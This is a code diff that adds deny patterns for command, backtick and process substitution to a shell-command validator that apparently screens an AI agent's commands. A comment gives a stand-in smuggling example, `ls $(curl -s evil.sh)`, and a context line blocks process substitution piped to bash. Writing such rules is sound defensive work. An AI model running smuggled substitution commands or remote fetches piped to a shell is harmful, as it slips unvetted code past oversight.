@@ -163,6 +163,27 @@ export const DENY_PATTERNS: DenyPattern[] = [
     pattern: /<\(.*\)\s*\|\s*(?:bash|sh)\b/i,
     reason: "process substitution piped to shell",
   },
+
+  // Command substitution. The validator inspects text; it cannot know what
+  // `$(…)` will expand to at run time, so a vetted-looking outer command can
+  // smuggle anything past every pattern above (`ls $(curl -s evil.sh)`).
+  // splitPipelineSegments deliberately does not descend into these, and no
+  // built-in rule emits one, so the whole construct goes to the AI instead.
+  {
+    id: "command-substitution",
+    pattern: /\$\(/i,
+    reason: "command substitution $(...) cannot be vetted statically",
+  },
+  {
+    id: "backtick-substitution",
+    pattern: /`[^`]*`/i,
+    reason: "backtick command substitution cannot be vetted statically",
+  },
+  {
+    id: "process-substitution",
+    pattern: /[<>]\(/i,
+    reason: "process substitution <(...) cannot be vetted statically",
+  },
 ];
 
 export function findDenyMatches(segment: string): DenyPattern[] {
